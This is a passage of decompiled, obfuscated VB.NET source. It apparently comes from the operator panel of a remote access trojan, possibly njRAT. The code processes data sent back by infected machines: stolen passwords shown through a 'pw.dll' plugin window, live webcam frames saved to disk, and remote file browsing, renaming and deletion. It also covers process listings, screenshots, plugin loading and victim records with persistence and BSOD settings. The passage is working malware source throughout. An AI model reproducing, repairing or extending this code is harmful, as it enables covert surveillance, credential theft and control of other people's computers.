										Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
									ElseIf Operators.CompareString(array2(1), Class7.smethod_0("pw.dll", Nothing).string_1, False) = 0 Then
										Dim pass As Pass = CType(Class7.smethod_3("Pass"), Pass)
										If pass Is Nothing Then
											pass = New Pass()
											pass.Show()
										End If
										Dim pass2 As Pass = pass
										Dim client3 As Client = client
										Dim text5 As String = Class6.smethod_16(array2(2))
										Dim text6 As String = text5
										pass2.XD(client3, text6)
									End If
								ElseIf Operators.CompareString(left, "inf", False) = 0 Then
									If client.L IsNot Nothing Then
										Dim array24 As String() = Strings.Split(Class6.smethod_16(array2(1)), vbCrLf, -1, CompareMethod.Binary)
										Dim text7 As String = "+++ Server Info"
										Dim num17 As Integer = array24.Length - 1
										For num18 As Integer = 0 To num17
											text7 = String.Concat(New String() { text7, vbCrLf & "{", Conversions.ToString(num18), "}  ", array24(num18) })
										Next
										client.L.Cells(0).ToolTipText = String.Format(text7, New Object() { "Name", "Host", "Dir", "Exe", "Copy", "StartUP F", "StartUp R", "BSOD" })
									End If
								Else
									If Operators.CompareString(left, "FM", False) = 0 Then
										Dim manager8 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
										If manager8 Is Nothing Then
											Return
										End If
										Dim left6 As String = array2(1)
										If Operators.CompareString(left6, "!", False) = 0 Then
											manager8.L1.Items.Clear()
											Dim num19 As Integer = 0
											Dim list6 As List(Of ListViewItem) = New List(Of ListViewItem)()
											Dim num20 As Integer = array2.Length - 1
											For num21 As Integer = 2 To num20
												Dim array25 As String() = Strings.Split(Class6.smethod_16(array2(num21)), "*", -1, CompareMethod.Binary)
												Dim directoryInfo As DirectoryInfo = New DirectoryInfo(array25(0))
												Dim listViewItem7 As ListViewItem = New ListViewItem(directoryInfo.Name)
												listViewItem7.ToolTipText = directoryInfo.FullName
												listViewItem7.SubItems.Add(array25(1))
												Dim left7 As String = array25(1)
												If Operators.CompareString(left7, DriveType.Fixed.ToString(), False) = 0 Then
													listViewItem7.ImageIndex = 1
												ElseIf Operators.CompareString(left7, DriveType.Removable.ToString(), False) = 0 Then
													listViewItem7.ImageIndex = 3
												ElseIf Operators.CompareString(left7, DriveType.CDRom.ToString(), False) = 0 Then
													listViewItem7.ImageIndex = 2
												ElseIf Operators.CompareString(left7, String.Empty, False) = 0 Then
													listViewItem7.ImageIndex = 0
													Select Case num19
														Case 0
															listViewItem7.Text = "Desktop"
														Case 1
															listViewItem7.Text = "MyPictures"
														Case 2
															listViewItem7.Text = "UserProfile"
														Case 3
															listViewItem7.Text = "StartUp"
													End Select
													num19 += 1
													listViewItem7.SubItems(1).Text = "DIR"
												Else
													listViewItem7.ImageIndex = If((Operators.CompareString(left7, DriveType.Network.ToString(), False) <> 0), 1, 5)
												End If
												list6.Add(listViewItem7)
												If list6.Count > 10 Then
													manager8.L1.Items.AddRange(list6.ToArray())
													list6.Clear()
												End If
											Next
											If list6.Count > 0 Then
												manager8.L1.Items.AddRange(list6.ToArray())
												list6.Clear()
											End If
											manager8.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
											GoTo IL_460F
										End If
										If Operators.CompareString(left6, "@", False) = 0 Then
											Dim pr4 As ToolStripProgressBar = manager8.pr
											SyncLock pr4
												If manager8.Cache.Contains(Class6.smethod_16(array2(2))) Then
													manager8.Cache.Remove(Class6.smethod_16(array2(2)))
												End If
												Dim gclass2 As Manager.GClass14 = New Manager.GClass14()
												gclass2.string_0 = Class6.smethod_16(array2(2))
												manager8.Cache.Add(gclass2, gclass2.string_0, Nothing, Nothing)
												Dim directoryInfo2 As DirectoryInfo = New DirectoryInfo(Class6.smethod_16(array2(2)))
												If Operators.CompareString(manager8.TextBox1.Text, directoryInfo2.FullName, False) <> 0 Then
													gclass2.list_1.Clear()
													gclass2.list_0.Clear()
													Try
														manager8.Cache.Remove(Class6.smethod_16(array2(2)))
														GoTo IL_28A9
													Catch ex11 As Exception
														GoTo IL_28A9
													End Try
												End If
												manager8.pr.Value = 0
												Dim array26 As String() = Strings.Split(array2(3), "*", -1, CompareMethod.Binary)
												manager8.pr.Maximum = array26.Length - 1
												manager8.L2.Items.Clear()
												If directoryInfo2.Parent IsNot Nothing Then
													Dim listViewItem8 As ListViewItem = manager8.L2.Items.Add("..", "..", 0)
													listViewItem8.ToolTipText = directoryInfo2.Parent.FullName
													listViewItem8.SubItems.Add(String.Empty)
													listViewItem8.SubItems.Add("DIR")
												End If
												manager8.vmethod_108.Images.Clear()
												manager8.vmethod_108.Images.Add(manager8.MG.Images(0))
												manager8.vmethod_108.Images.Add("*", manager8.MG.Images(4))
												Dim list7 As List(Of ListViewItem) = New List(Of ListViewItem)()
												Dim num22 As Integer = array26.Length - 2
												For num23 As Integer = 0 To num22
													If Operators.CompareString(manager8.TextBox1.Text, directoryInfo2.FullName, False) <> 0 Then
														gclass2.list_1.Clear()
														gclass2.list_0.Clear()
														Try
															manager8.Cache.Remove(Class6.smethod_16(array2(2)))
														Catch ex12 As Exception
														End Try
														GoTo IL_28A9
													End If
													Dim listViewItem9 As ListViewItem = New ListViewItem(Class6.smethod_16(array26(num23)), 0)
													Dim listViewItem10 As ListViewItem = listViewItem9
													listViewItem10.SubItems.Add(String.Empty)
													listViewItem10.SubItems.Add("DIR")
													listViewItem10.ToolTipText = directoryInfo2.FullName + listViewItem10.Text
													gclass2.list_0.Add(listViewItem10.ToolTipText)
													Dim pr5 As ToolStripProgressBar = manager8.pr
													pr5.Value += 1
													list7.Add(listViewItem9)
													If list7.Count > 20 Then
														manager8.L2.Items.AddRange(list7.ToArray())
														list7.Clear()
													End If
												Next
												If list7.Count > 0 Then
													manager8.L2.Items.AddRange(list7.ToArray())
													list7.Clear()
												End If
												manager8.TextBox1.BackColor = Color.Gainsboro
												manager8.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
												client.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "@", Class7.string_1, array2(2) }))
												manager8.pr.Value = 0
												IL_28A9:
												GoTo IL_460F
											End SyncLock
										End If
										If Operators.CompareString(left6, "#", False) = 0 Then
											Dim pr6 As ToolStripProgressBar = manager8.pr
											SyncLock pr6
												Dim text8 As String = Class6.smethod_16(array2(2))
												If Operators.CompareString(manager8.TextBox1.Text, text8, False) <> 0 Then
													Return
												End If
												Dim gclass3 As Manager.GClass14 = CType(manager8.Cache(Class6.smethod_16(array2(2))), Manager.GClass14)
												gclass3.list_1.Clear()
												manager8.pr.Value = 0
												Dim array27 As String() = Strings.Split(array2(3), "*", -1, CompareMethod.Binary)
												manager8.pr.Maximum = array27.Length - 1
												Dim list8 As List(Of ListViewItem) = New List(Of ListViewItem)()
												Dim num24 As Integer = array27.Length - 2
												For num25 As Integer = 0 To num24
													Dim array28 As String() = Strings.Split(Class6.smethod_16(array27(num25)), "*", -1, CompareMethod.Binary)
													If Operators.CompareString(manager8.TextBox1.Text, text8, False) <> 0 Then
														gclass3.list_1.Clear()
														gclass3.list_0.Clear()
														Try
															manager8.Cache.Remove(Class6.smethod_16(array2(2)))
															Return
														Catch ex13 As Exception
															Return
														End Try
														IL_2D37:
														manager8.TextBox1.BackColor = Color.WhiteSmoke
														manager8.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
														manager8.pr.Value = 0
														GoTo IL_460F
													End If
													Dim listViewItem11 As ListViewItem = New ListViewItem(array28(0))
													Dim listViewItem12 As ListViewItem = listViewItem11
													Dim fileInfo As FileInfo = New FileInfo(text8 + array28(0))
													listViewItem12.ToolTipText = fileInfo.FullName
													listViewItem12.SubItems.Add(Class6.smethod_17(Conversions.ToLong(array28(1))))
													listViewItem12.Name = listViewItem12.ToolTipText
													If array28.Length = 2 Then
														If Operators.CompareString(fileInfo.Extension, String.Empty, False) = 0 Then
															listViewItem12.SubItems.Add(String.Empty)
															listViewItem12.ImageKey = "*"
														Else
															listViewItem12.SubItems.Add(fileInfo.Extension.Replace(".", String.Empty))
															If Not manager8.vmethod_108.Images.ContainsKey(fileInfo.Extension) Then
																File.Create(Application.StartupPath + "\!" + fileInfo.Extension).Close()
																manager8.vmethod_108.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\!" + fileInfo.Extension))
																File.Delete(Application.StartupPath + "\!" + fileInfo.Extension)
																listViewItem12.ImageKey = fileInfo.Extension
															Else
																listViewItem12.ImageKey = fileInfo.Extension
															End If
														End If
													Else
														listViewItem12.SubItems.Add(fileInfo.Extension.Remove(0, 1))
														If Not manager8.vmethod_108.Images.ContainsKey(listViewItem12.ToolTipText) Then
															manager8.vmethod_108.Images.Add(listViewItem12.ToolTipText, Image.FromStream(New MemoryStream(Convert.FromBase64String(array28(2)))))
														End If
														If Not manager8.Images.Contains("!" + listViewItem12.ToolTipText) Then
															manager8.Images.Add(manager8.vmethod_108.Images(listViewItem12.ToolTipText), "!" + listViewItem12.ToolTipText, Nothing, Nothing)
														End If
														listViewItem12.ImageKey = listViewItem12.ToolTipText
													End If
													gclass3.list_1.Add(String.Concat(New String() { listViewItem12.ToolTipText, "*", listViewItem12.SubItems(1).Text, "*", listViewItem12.SubItems(2).Text }))
													Dim pr7 As ToolStripProgressBar = manager8.pr
													pr7.Value += 1
													list8.Add(listViewItem11)
													If list8.Count > 20 Then
														manager8.L2.Items.AddRange(list8.ToArray())
														list8.Clear()
													End If
												Next
												If list8.Count > 0 Then
													manager8.L2.Items.AddRange(list8.ToArray())
													list8.Clear()
													GoTo IL_2D37
												End If
												GoTo IL_2D37
											End SyncLock
										End If
										If Operators.CompareString(left6, "$", False) = 0 Then
											If manager8.Images.Contains(Class6.smethod_16(array2(2))) Then
												manager8.Images.Remove(Class6.smethod_16(array2(2)))
											End If
											manager8.Images.Add(Image.FromStream(New MemoryStream(CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(2) + Class7.string_1), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte()))), Class6.smethod_16(array2(2)), Nothing, Nothing)
											If manager8.L2.Items.ContainsKey(Class6.smethod_16(array2(2))) AndAlso manager8.L2.Items(Class6.smethod_16(array2(2))).Selected Then
												manager8.p.Image = CType(manager8.Images(Class6.smethod_16(array2(2))), Image)
												manager8.p.Visible = True
												GoTo IL_460F
											End If
											Return
										ElseIf Operators.CompareString(left6, "%", False) = 0 Then
											If Class7.form1_0.InvokeRequired Then
												Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
												GoTo IL_460F
											End If
											Dim note As Note = New Note()
											note.FN = Class6.smethod_16(array2(2))
											note.Text = manager8.Text + " - " + note.FN
											note.SK = manager8.sk
											note.TextBox1.Text = Class6.smethod_16(array2(3)).Replace(vbNullChar, String.Empty)
											note.Show()
											note.FlatButton2.Enabled = False
											GoTo IL_460F
										Else
											If Operators.CompareString(left6, "dl", False) = 0 Then
												Dim array29 As String() = Strings.Split(Class6.smethod_16(array2(2)), "*", -1, CompareMethod.Binary)
												Try
													Try
														For Each obj8 As Object In manager8.L2.Items
															Dim listViewItem13 As ListViewItem = CType(obj8, ListViewItem)
															If Operators.CompareString(array29(1), "!", False) = 0 Then
																If Not(Operators.CompareString(listViewItem13.Text, New DirectoryInfo(array29(0)).Name, False) = 0 And Operators.CompareString(listViewItem13.SubItems(2).Text, "DIR", False) = 0) Then
																	Continue For
																End If
																listViewItem13.Remove()
															Else
																If Not(Operators.CompareString(listViewItem13.Text, New DirectoryInfo(array29(0)).Name, False) = 0 And Operators.CompareString(listViewItem13.SubItems(2).Text, "DIR", False) <> 0) Then
																	Continue For
																End If
																listViewItem13.Remove()
															End If
															Exit For
														Next
													Finally
														Dim enumerator7 As IEnumerator
														If TypeOf enumerator7 Is IDisposable Then
															TryCast(enumerator7, IDisposable).Dispose()
														End If
													End Try
													GoTo IL_460F
												Finally
													Dim enumerator8 As IEnumerator
													If TypeOf enumerator8 Is IDisposable Then
														TryCast(enumerator8, IDisposable).Dispose()
													End If
												End Try
											End If
											If Operators.CompareString(left6, "nm", False) = 0 Then
												Dim array30 As String() = Strings.Split(Class6.smethod_16(array2(2)), "*", -1, CompareMethod.Binary)
												Try
													Try
														For Each obj9 As Object In manager8.L2.Items
															Dim listViewItem14 As ListViewItem = CType(obj9, ListViewItem)
															If Operators.CompareString(listViewItem14.ToolTipText, array30(0), False) = 0 Then
																If Operators.CompareString(array30(2), "*", False) = 0 Then
																	Dim directoryInfo3 As DirectoryInfo = New DirectoryInfo(array30(0))
																	listViewItem14.Text = array30(1)
																	listViewItem14.ToolTipText = directoryInfo3.Parent.FullName + "\" + listViewItem14.Text
																Else
																	Dim fileInfo2 As FileInfo = New FileInfo(array30(0))
																	listViewItem14.Text = array30(1)
																	listViewItem14.ToolTipText = fileInfo2.Directory.FullName + "\" + listViewItem14.Text
																	listViewItem14.SubItems(2).Text = New FileInfo(listViewItem14.ToolTipText).Extension.Replace(".", String.Empty)
																End If
															End If
														Next
													Finally
														Dim enumerator9 As IEnumerator
														If TypeOf enumerator9 Is IDisposable Then
															TryCast(enumerator9, IDisposable).Dispose()
														End If
													End Try
													GoTo IL_460F
												Finally
													Dim enumerator10 As IEnumerator
													If TypeOf enumerator10 Is IDisposable Then
														TryCast(enumerator10, IDisposable).Dispose()
													End If
												End Try
											End If
											If Operators.CompareString(left6, "ER", False) <> 0 Then
												Return
											End If
											manager8.SL.Text = array2(3)
											If Not array2(3).StartsWith("UnRAR_") Then
												Return
											End If
											Dim pr8 As ToolStripProgressBar = manager8.pr
											SyncLock pr8
												Dim fileInfo3 As FileInfo = New FileInfo(array2(3))
												If Operators.CompareString(fileInfo3.Directory.FullName.ToLower() + "\", manager8.TextBox1.Text.ToLower(), False) <> 0 Then
													Return
												End If
												Dim listViewItem15 As ListViewItem = manager8.L2.Items.Add(fileInfo3.FullName, fileInfo3.Name, 0)
												listViewItem15.SubItems.Add(String.Empty)
												listViewItem15.SubItems.Add("DIR")
												GoTo IL_460F
											End SyncLock
										End If
									End If
									If Operators.CompareString(left, "CAM", False) = 0 Then
										If client.osk Is Nothing Then
											client.isPL = True
											Try
												client.osk = Class7.sk_0.GetClient(array2(1))
											Catch ex14 As Exception
												client.CN = False
											End Try
										End If
										Dim cam As Cam = CType(Class7.smethod_3("cam" + client.ip()), Cam)
										Dim left8 As String = array2(2)
										If Operators.CompareString(left8, "~", False) = 0 Then
											If cam Is Nothing Then
												If Class7.form1_0.InvokeRequired Then
													Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
												Else
													Dim cam2 As Cam = New Cam()
													cam2.sk = client
													cam2.osk = client.osk
													cam2.Name = "cam" + client.ip()
													Dim num26 As Integer = array2.Length - 1
													For num27 As Integer = 3 To num26
														cam2.ComboBox1.SelectedIndex = cam2.ComboBox1.Items.Add(array2(num27))
													Next
													cam2.Show()
												End If
											Else
												Dim num28 As Integer = array2.Length - 1
												For num29 As Integer = 3 To num28
													cam.ComboBox1.SelectedIndex = cam.ComboBox1.Items.Add(array2(num29))
												Next
											End If
										ElseIf Operators.CompareString(left8, "!", False) = 0 Then
											If cam IsNot Nothing Then
												Dim cam3 As Cam = cam
												cam3.fps += 1
												cam.pkt = array.Length
												Thread.Sleep(10)
												If array2(3).Length <> 1 Then
													Dim image As Image = Image.FromStream(New MemoryStream(CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(2) + Class7.string_1), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte())))
													If cam.CheckBox3.Checked Then
														Try
															image.Save(cam.folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg")
														Catch ex15 As Exception
														End Try
													End If
													cam.PictureBox1.Image = image
												End If
											End If
										ElseIf Operators.CompareString(left8, "@", False) = 0 AndAlso cam IsNot Nothing Then
											cam.Button1.Text = "Start"
										End If
									Else
										If Operators.CompareString(left, "proc", False) = 0 Then
											Dim manager9 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
											If manager9 Is Nothing Then
												Return
											End If
											Dim pr9 As ToolStripProgressBar = manager9.pr
											SyncLock pr9
												Dim left9 As String = array2(1)
												If Operators.CompareString(left9, "pid", False) = 0 Then
													manager9.PID = Conversions.ToInteger(array2(2))
												Else
													If Operators.CompareString(left9, "!", False) = 0 Then
														Dim obj10 As Manager = manager9
														SyncLock obj10
															Dim array31 As String() = Strings.Split(array2(2), "[::]", -1, CompareMethod.Binary)
															Dim flag2 As Boolean
															If Not Class7.InlineAssignHelper(Of Boolean)(flag2, manager9.LPR.Items.Count = 0) Then
																Try
																	Try
																		For Each obj11 As Object In manager9.LPR.Items
																			Dim listViewItem16 As ListViewItem = CType(obj11, ListViewItem)
																			If listViewItem16.ForeColor = Color.GreenYellow Then
																				Try
																					Try
																						For Each obj12 As Object In listViewItem16.SubItems
																							Dim listViewSubItem As ListViewItem.ListViewSubItem = CType(obj12, ListViewItem.ListViewSubItem)
																							listViewSubItem.ForeColor = manager9.LPR.ForeColor
																						Next
																					Finally
																						Dim enumerator12 As IEnumerator
																						If TypeOf enumerator12 Is IDisposable Then
																							TryCast(enumerator12, IDisposable).Dispose()
																						End If
																					End Try
																				Finally
																					Dim enumerator13 As IEnumerator
																					If TypeOf enumerator13 Is IDisposable Then
																						TryCast(enumerator13, IDisposable).Dispose()
																					End If
																				End Try
																			End If
																		Next
																	Finally
																		Dim enumerator11 As IEnumerator
																		If TypeOf enumerator11 Is IDisposable Then
																			TryCast(enumerator11, IDisposable).Dispose()
																		End If
																	End Try
																Finally
																	Dim enumerator14 As IEnumerator
																	If TypeOf enumerator14 Is IDisposable Then
																		TryCast(enumerator14, IDisposable).Dispose()
																	End If
																End Try
															End If
															If array31.Length > 1 Then
																manager9.pr.Value = 0
																manager9.pr.Maximum = array31.Length
																Dim list9 As List(Of ListViewItem) = New List(Of ListViewItem)()
																Dim array32 As String() = array31
																Dim num30 As Integer = 0
																While num30 < array32.Length
																	Dim text9 As String = array32(num30)
																	Dim array33 As String() = Strings.Split(text9, "[:]", -1, CompareMethod.Binary)
																	If Operators.CompareString(text9, String.Empty, False) = 0 Then
																		Exit While
																	End If
																	If array33(2).StartsWith("\??\") Then
																		array33(2) = array33(2).Remove(0, "\??\".Length)
																	End If
																	Try
																		Dim pr10 As ToolStripProgressBar = manager9.pr
																		pr10.Value += 1
																		GoTo IL_3A24
																	Catch ex16 As Exception
																		GoTo IL_3A24
																	End Try
																	GoTo IL_38AB
																	IL_3908:
																	Dim text10 As String = " "
																	Dim listViewItem17 As ListViewItem
																	listViewItem17.SubItems.Add(array33(3))
																	If array33(4).StartsWith("""") Then
																		text10 = """"
																		array33(4) = array33(4).Remove(0, 1)
																	End If
																	If array33(4).Contains(text10) Then
																		array33(4) = array33(4).Remove(0, Strings.InStr(array33(4), text10, CompareMethod.Binary))
																		If array33(4).StartsWith(" ") Then
																			array33(4) = array33(4).Remove(0, 1)
																		End If
																		listViewItem17.SubItems.Add(array33(4))
																	Else
																		listViewItem17.SubItems.Add(String.Empty)
																	End If
																	If Not flag2 Then
																		listViewItem17.ForeColor = Color.GreenYellow
																	End If
																	If Conversions.ToInteger(array33(1)) = manager9.PID Then
																		listViewItem17.ForeColor = Color.Red
																	End If
																	list9.Add(listViewItem17)
																	If list9.Count > 10 Then
																		manager9.LPR.Items.AddRange(list9.ToArray())
																		list9.Clear()
																	End If
																	num30 += 1
																	Continue While
																	IL_38AB:
																	listViewItem17.SubItems.Add(New FileInfo(array33(2).Replace("""", String.Empty)).Directory.Name)
																	listViewItem17.ToolTipText = array33(2).Replace("""", String.Empty)
																	GoTo IL_3908
																	IL_3A24:
																	listViewItem17 = New ListViewItem(array33(0))
																	listViewItem17.SubItems.Add(array33(1))
																	listViewItem17.Name = array33(1)
																	If array33(2).Contains(":\") Then
																		GoTo IL_38AB
																	End If
																	listViewItem17.SubItems.Add(String.Empty)
																	GoTo IL_3908
																End While
																If list9.Count > 0 Then
																	manager9.LPR.Items.AddRange(list9.ToArray())
																	list9.Clear()
																End If
																If manager9.PRFX Then
																	manager9.PRFX = False
																	manager9.LPR.method_3()
																End If
																Dim columnHeader_3 As ColumnHeader = manager9.LPR.columnHeader_0
																If columnHeader_3 Is Nothing Then
																	manager9.LPR.GClass9_ColumnClick(manager9.LPR, New ColumnClickEventArgs(0))
																Else
																	columnHeader_3.Tag = RuntimeHelpers.GetObjectValue(If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "+", False)), If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "-", False)), "-", "+"), "-"))
																	manager9.LPR.GClass9_ColumnClick(manager9.LPR, New ColumnClickEventArgs(columnHeader_3.Index))
																End If
															End If
															manager9.PRNXT = True
															GoTo IL_3BCC
														End SyncLock
													End If
													If Operators.CompareString(left9, "RM", False) = 0 Then
														Dim num31 As Integer = array2.Length - 1
														For num32 As Integer = 2 To num31
															manager9.LPR.Items.RemoveByKey(array2(num32))
														Next
													ElseIf Operators.CompareString(left9, "ER", False) = 0 Then
														manager9.SL.Text = array2(2)
													End If
												End If
												IL_3BCC:
												GoTo IL_460F
											End SyncLock
										End If
										If Operators.CompareString(left, "lv", False) <> 0 AndAlso Operators.CompareString(left, "ll", False) <> 0 Then
											If Operators.CompareString(left, "P", False) = 0 Then
												If client.L IsNot Nothing AndAlso client.L.Cells.Count > Class7.int_10 Then
													Dim online As Collection = Class7.form1_0.S.Online
													SyncLock online
														Dim dataGridViewCell As DataGridViewCell = client.L.Cells(Class7.int_10)
														Dim num33 As Integer = Conversions.ToInteger(array2(1))
														dataGridViewCell.Style.ForeColor = If((num33 <> 999), If((num33 < 500), If((num33 < 250), Color.LimeGreen, Color.LightGreen), Color.GreenYellow), Color.Orange)
														client.L.Cells(Class7.int_10).Value = array2(1) + "ms"
													End SyncLock
												End If
											ElseIf Operators.CompareString(left, "bla", False) = 0 Then
												client.L.DefaultCellStyle.ForeColor = Class7.form1_0.L1.DefaultCellStyle.ForeColor
											ElseIf Operators.CompareString(left, "~", False) = 0 Then
												client.Send("~")
											ElseIf Operators.CompareString(left, "MSG", False) = 0 Then
												If Class7.class8_0.bool_5 Then
													Class7.form1_0.Pp1.WRT(New Object() { RuntimeHelpers.GetObjectValue(Color.LightSteelBlue), Class6.smethod_13(), RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue), client.COI, client.ip(), RuntimeHelpers.GetObjectValue(Color.SteelBlue), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))), vbCrLf, RuntimeHelpers.GetObjectValue(Color.Purple), "-->", RuntimeHelpers.GetObjectValue(Color.White), array2(1) })
												End If
											ElseIf Operators.CompareString(left, "ER", False) = 0 Then
												If Class7.class8_0.bool_4 Then
													Class7.form1_0.Pp1.WRT(New Object() { RuntimeHelpers.GetObjectValue(Color.LightSteelBlue), Class6.smethod_13(), RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue), client.COI, client.ip(), RuntimeHelpers.GetObjectValue(Color.SteelBlue), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))), vbCrLf, RuntimeHelpers.GetObjectValue(Color.Purple), "-->", RuntimeHelpers.GetObjectValue(Color.White), array2(1) + " " + array2(2) })
												End If
											ElseIf Operators.CompareString(left, "pl", False) = 0 Then
												Try
													client.plg.Remove(array2(1))
												Catch ex17 As Exception
												End Try
												If Operators.CompareString(array2(2).ToString(), "0", False) = 0 Then
													client.plg.Add(array2(1))
												Else
													Class7.smethod_2(client, Class7.smethod_0(Nothing, array2(1)), Conversions.ToBoolean(array2(2)))
												End If
											Else
												If Operators.CompareString(left, "CAP", False) = 0 Then
													Try
														client.lastPC = DateAndTime.Now
														client.Isend = False
														Dim array34 As Byte() = CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, Class7.string_1), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte())
														If array34.Length < 10 Then
															Return
														End If
														client.L.Cells(0).Value = Image.FromStream(New MemoryStream(array34))
														Return
													Catch ex18 As Exception
														Return
													End Try
												End If
												If Operators.CompareString(left, "act", False) = 0 AndAlso client.L IsNot Nothing AndAlso Operators.CompareString(client.lastAC, array2(1), False) <> 0 Then
													client.lastAC = array2(1)
													Dim online2 As Collection = Class7.form1_0.S.Online
													SyncLock online2
														client.L.Cells(Class7.int_11).Value = Class6.smethod_16(array2(1))
													End SyncLock
												End If
											End If
										Else
											Try
												If client.L IsNot Nothing Then
													Class7.form1_0.L1.method_9(client.L)
												End If
												Dim list10 As List(Of Object) = New List(Of Object)()
												list10.Add(Resources.JPEG)
												list10.Add(Class6.smethod_16(array2(1)))
												list10.Add(Strings.Split(client.ip(), ":", -1, CompareMethod.Binary)(0))
												Dim num34 As Integer = array2.Length - 2
												For num35 As Integer = 2 To num34
													Dim num36 As Integer = num35 + 1
													If num36 = Class7.int_11 - 1 Then
														client.lastAC = array2(num35)
														list10.Add(Class6.smethod_16(array2(num35)))
													ElseIf num36 = Class7.int_5 Then
														list10.Add(client.COI)
														list10.Add(client.CName)
													Else
														list10.Add(array2(num35))
													End If
												Next
												client.Folder = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(list10(Class7.int_2)), "_")), RuntimeHelpers.GetObjectValue(list10(Class7.int_3)))), "_")), Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10(Class7.int_0))), "_", -1, CompareMethod.Binary)(Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10(Class7.int_0))), "_", -1, CompareMethod.Binary).Length - 1))))
												Dim text11 As String = "\/<>?*:|"""
												Dim num37 As Integer = 0
												Dim length As Integer = text11.Length
												While num37 < length
													Dim text12 As String = Conversions.ToString(text11(num37))
													client.Folder = client.Folder.Replace(text12, "%" + Conversion.Hex(Strings.Asc(text12)))
													num37 += 1
												End While
												client.Folder = Application.StartupPath + "\nj_users\" + client.Folder + "\"
												client.L = Class7.form1_0.L1.method_8(client.ip(), list10.ToArray())
												client.L.Tag = client
												list10.Clear()
												client.plg.AddRange(Strings.Split(array2(array2.Length - 1), ",", -1, CompareMethod.Binary))
											Catch ex19 As Exception
											End Try
											If Class7.class8_0.bool_1 Then
												Class7.form1_0.Pp1.WRT(New Object() { RuntimeHelpers.GetObjectValue(Color.LightSteelBlue), Class6.smethod_13(), RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue), client.COI, client.ip(), RuntimeHelpers.GetObjectValue(Color.SteelBlue), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))), RuntimeHelpers.GetObjectValue(Color.DarkBlue), "Ready" })
											End If
											If Class7.class8_0.bool_0 Then
												Class7.notf_0.AddItem(client.COI, String.Format(Resources.notf, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_2).Value))), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_3).Value))), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_7).Value))), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_6).Value))), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_9).Value))), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells(Class7.int_0).Value))), client.ip().Split(New Char() { ":"c })(0) }))
											End If
										End If
									End If
								End If
							End If
						End If
					End If
				End If
				IL_460F:
			Catch ex20 As Exception
				Dim ex21 As Exception = ex20
				If Operators.CompareString(array2(0), "up", False) = 0 Or Operators.CompareString(array2(0), "dw", False) = 0 Then
					Try
						client.Send("close" + Class7.string_1 + array2(1))
					Catch ex22 As Exception
					End Try
				Else
					If Operators.CompareString(array2(0).ToLower(), "cap", False) = 0 Then
						client.Isend = False
					End If
					If Class7.class8_0.bool_3 Then
						Class7.form1_0.Pp1.WRT(New Object() { RuntimeHelpers.GetObjectValue(Color.LightSteelBlue), Class6.smethod_13(), RuntimeHelpers.GetObjectValue(Color.BlueViolet), "Listner", RuntimeHelpers.GetObjectValue(Color.DarkRed), "ERR AT ", RuntimeHelpers.GetObjectValue(Color.White), array2(0), RuntimeHelpers.GetObjectValue(Color.Red), ex21.Message })
					End If
				End If
			End Try
		End Sub

		' Token: 0x06000733 RID: 1843 RVA: 0x0003EADC File Offset: 0x0003CCDC
		Private Function InlineAssignHelper(Of T)(ByRef target As T, value As T) As T
			target = value
			Return value
		End Function

		' Token: 0x04000375 RID: 885
		Public class8_0 As Class7.Class8 = New Class7.Class8()

		' Token: 0x04000376 RID: 886
